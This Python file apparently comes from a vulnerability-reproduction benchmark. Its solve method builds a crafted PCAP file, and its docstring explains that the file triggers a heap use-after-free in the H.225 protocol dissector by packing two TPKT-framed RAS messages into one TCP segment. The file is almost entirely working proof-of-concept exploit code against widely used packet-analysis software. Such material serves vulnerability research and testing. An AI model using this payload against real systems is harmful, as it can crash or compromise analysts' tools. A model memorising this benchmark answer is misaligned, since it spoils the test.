import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the Heap Use After Free vulnerability
        in the h225 dissector.

        The vulnerability occurs when two H.225 RasMessages are processed from
        the same TCP segment. The dissector state is not properly re-initialized,
        leading to the use of a stale pointer that was freed after processing
        the first message.

        The trigger condition requires:
        1. Two H.225 messages in the same TCP stream.
        2. The first message's PDU must contain a parsable RasMessage followed
           by at least one byte of extra data. This extra data causes the
           dissector to allocate a reassembly buffer via `next_tvb_add_tvb`.
        3. The dissector is called again for the second message without
           re-initializing the reassembly state (i.e., without calling
           `next_tvb_init`).
        4. The processing of the second message attempts to use the reassembly
           buffer, which now points to freed memory, causing a crash.

        This PoC constructs a minimal PCAP file with a single packet. The
        packet's TCP payload contains two TPKT-framed messages structured to
        meet these conditions.
        """

        # A minimal, likely invalid, but parsable-enough RasMessage. A single
        # byte is often sufficient to pass initial parsing and reach the
        # vulnerable code path.
        ras_message = b'\x00'
        
        # A single byte of "garbage" data. This ensures that after the
        # RasMessage is parsed, there is remaining data in the PDU, which
        # is the trigger for the vulnerable allocation pattern.
        garbage = b'\x01'
        
        # The H.225 PDU payload.
        pdu = ras_message + garbage

        # TPKT header: version 3, reserved 0, length. The length field
        # includes the 4-byte TPKT header itself.
        tpkt_len = 4 + len(pdu)
        tpkt_header = struct.pack('!BBH', 3, 0, tpkt_len)

        # The full TCP payload consists of two consecutive TPKT messages.
        tcp_payload = (tpkt_header + pdu) * 2

        # We construct a PCAP file containing a single packet with the crafted
        # TCP payload. While the ground-truth PoC is 73 bytes (likely using
        # pcap-mangling tricks), a standardly-formed pcap file is more robust
        # and should also trigger the vulnerability.

        # PCAP Global Header (24 bytes)
        pcap_global_header = struct.pack(
            '<IHHIIII',
            0xa1b2c3d4,  # magic_number
            2, 4,        # version_major, version_minor
            0,           # thiszone (GMT)
            0,           # sigfigs
            65535,       # snaplen
            1            # network (LINKTYPE_ETHERNET)
        )

        # L2: Ethernet Header (14 bytes) - Dst/Src MACs and IPv4 EtherType
        eth_header = b'\x00\x00\x00\x00\x00\x00' + b'\x00\x00\x00\x00\x00\x00' + b'\x08\x00'

        # L3: IP Header (20 bytes)
        ip_total_len = 20 + 20 + len(tcp_payload)
        ip_header = struct.pack(
            '!BBHHHBBHII',
            0x45, 0x00,              # Version (4), IHL (5), ToS
            ip_total_len,            # Total Length
            1, 0,                    # Identification, Flags, Fragment Offset
            64, 6,                   # TTL, Protocol (TCP)
            0,                       # Header Checksum (will be autofilled by kernel if sent)
            0x7f000001,              # Source IP (127.0.0.1)
            0x7f000001               # Destination IP (127.0.0.1)
        )

        # L4: TCP Header (20 bytes) - Port 1720 is for H.225/RAS
        tcp_header = struct.pack(
            '!HHIIBBHHH',
            49152, 1720,             # Source Port, Destination Port
            1, 1,                    # Sequence Number, Acknowledgement Number
            (5 << 4), 0x18,          # Data Offset (5*4=20 bytes), Flags (PSH, ACK)
            8192,                    # Window Size
            0, 0                     # Checksum, Urgent Pointer
        )

        packet_data = eth_header + ip_header + tcp_header + tcp_payload

        # PCAP Packet Header (16 bytes)
        packet_header = struct.pack(
            '<IIII',
            0, 0,                    # ts_sec, ts_usec
            len(packet_data),        # incl_len
            len(packet_data)         # orig_len
        )

        return pcap_global_header + packet_header + packet_data